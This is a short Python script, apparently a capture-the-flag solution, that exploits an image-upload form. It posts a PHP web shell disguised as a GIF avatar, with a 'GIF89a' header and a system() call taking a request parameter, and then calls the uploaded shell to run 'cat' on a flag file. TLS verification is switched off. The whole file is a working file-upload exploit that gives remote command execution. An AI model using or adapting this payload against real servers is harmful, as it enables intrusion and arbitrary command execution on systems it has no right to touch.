import sys
import urllib3

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8011"
BASE = BASE.rstrip("/")
SHELL = "h9-avatar.php"

webshell = (
    b"GIF89a\n"
    b'<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?>'
)

r = requests.post(
    BASE + "/",
    files={"avatar": (SHELL, webshell, "image/gif")},
    timeout=10,
    verify=False,
)
print(f"[+] upload status: {r.status_code}")

r = requests.get(BASE + f"/uploads/{SHELL}", params={"c": "cat /flag-12038102123124910213808410298418312098.txt"}, timeout=10, verify=False)
print(r.text.strip())
